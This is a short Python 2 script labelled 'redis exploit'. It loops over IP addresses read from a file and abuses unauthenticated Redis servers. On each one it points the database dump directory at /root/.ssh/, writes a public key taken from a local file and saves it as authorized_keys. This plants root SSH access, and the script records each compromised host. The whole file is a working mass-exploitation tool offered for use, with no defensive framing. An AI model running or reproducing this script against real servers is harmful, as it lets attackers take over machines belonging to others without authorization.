#!/usr/bin/python
import redis
def expredis(ipstr):
        # return 1 means ok
        # 0 means fail
	try:
		r = redis.Redis(host=ipstr, port=6379, db=0, socket_timeout=500)
	except:
		print 'failed to connect...'
		return 0
	#test   
	#r.set('foo', 'fooresult')
	#st = r.get('foo')
	#print st
	#set dir
	try:
		isdir = r.config_set('dir', '/root/.ssh/')
	except:
		print 'dir is wrong or failed to connect server...'
		return 0
	
	#print 'dir is right...'
	#di = r.config_get('dir')
	#print di
	#open auth.txt(public key)
	fo = open("foo.txt", "r")
	authstr = fo.read()
	#print authstr
	#config set auth
	try:
		r.set('am', authstr)
	except:
		return 0
	#config set dbfilename "authorized_keys"
	#set filename
	try:
		r.config_set('dbfilename', 'authorized_keys')
	except:
		return 0
	#set save
	try:
		r.save()
	except:
		return 0
	#print ipstr 
	fw = open("result.txt", "a")
	fw.write(ipstr+"\n")
	fw.close()
	return 1




if __name__=="__main__":
	#ip = 192.168.8.101
	print "redis exploit..."
	ipfp = open("ip.txt","r")
	iplist = ipfp.readlines()
	for ip in iplist:
		print 'exploit '+ip
		if expredis(ip) ==1:
            # add_ssh_user(ip)
			print ip + "ok..."
	ipfp.close()
